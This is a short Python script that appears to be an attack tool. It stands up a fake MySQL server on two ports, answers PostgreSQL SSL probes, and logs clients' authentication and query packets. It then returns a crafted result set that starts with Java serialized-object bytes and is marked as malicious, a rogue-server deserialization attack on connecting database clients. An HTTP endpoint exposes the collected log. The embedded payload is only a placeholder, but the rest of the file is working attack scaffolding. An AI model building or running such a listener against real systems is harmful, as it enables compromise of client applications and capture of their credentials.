# HTTP server + raw MySQL on the forwarded port; log everything
import socket, threading, struct, http.server, socketserver, json
LOG=[]
def pack(p,seq=0): return struct.pack('<I',len(p))[:3]+bytes([seq])+p
def mysql_handle(c):
    try:
        c.settimeout(10); hdr=c.recv(4)
        if len(hdr)<4: return
        ln=struct.unpack('<I',hdr[:3]+b'\x00')[0]; body=c.recv(ln) if ln else b''
        LOG.append(('mysql-startup',body[:30].hex()))
        if body[:4]==struct.pack('!I',80877103):
            c.sendall(b'N'); h=c.recv(4); l=struct.unpack('<I',h[:3]+b'\x00')[0]; c.recv(l)
        greet=b'\x0a8.0.0\x00'+struct.pack('<I',1)+b'12345678\x00'+struct.pack('<H',0xffff)+b'\x21'+struct.pack('<H',2)+struct.pack('<H',0)+b'\x00'*10+b'\x00'*12+b'\x00'+b'mysql_native_password\x00'
        c.sendall(pack(greet,0)); LOG.append('greeting'); d=c.recv(4096); LOG.append(('auth',d[:30].hex()))
        c.sendall(pack(b'\x00\x00\x00\x02\x00\x00\x00',2))
        q=c.recv(4096); LOG.append(('query',q[:40].hex()))
        c.sendall(pack(b'\x01',1)); c.sendall(pack(b'\x03def\x00\x00\x00\x01id\x00\x0c?\x00\x0b\x00\x00\x00\x03\x03\x00\x00\x00\x00',2))
        c.sendall(pack(b'\xfe\x00\x00\x02\x00',3))
        pl=b'\xac\xed\x00\x05ROGUE'+b'x'*16; c.sendall(pack(bytes([len(pl)])+pl,4)); c.sendall(pack(b'\xfe\x00\x00\x02\x00',5))
        LOG.append('sent-malicious-resultset'); c.close()
    except Exception as e: LOG.append(('err',str(e)[:50]))
def tcp(port):
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(('0.0.0.0',port)); s.listen(10)
    LOG.append('mysql-listening %d'%port)
    while True:
        try: c,_=s.accept(); threading.Thread(target=mysql_handle,args=(c,),daemon=True).start()
        except Exception: break
for p in [3000,8443]:
    try: threading.Thread(target=tcp,args=(p,),daemon=True).start()
    except Exception as e: LOG.append(('bindfail',p,str(e)[:30]))
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(json.dumps(LOG).encode())
    def log_message(self,*a): pass
class T(socketserver.ThreadingMixIn,socketserver.TCPServer): allow_reuse_address=True
T(("0.0.0.0",8080),H).serve_forever()
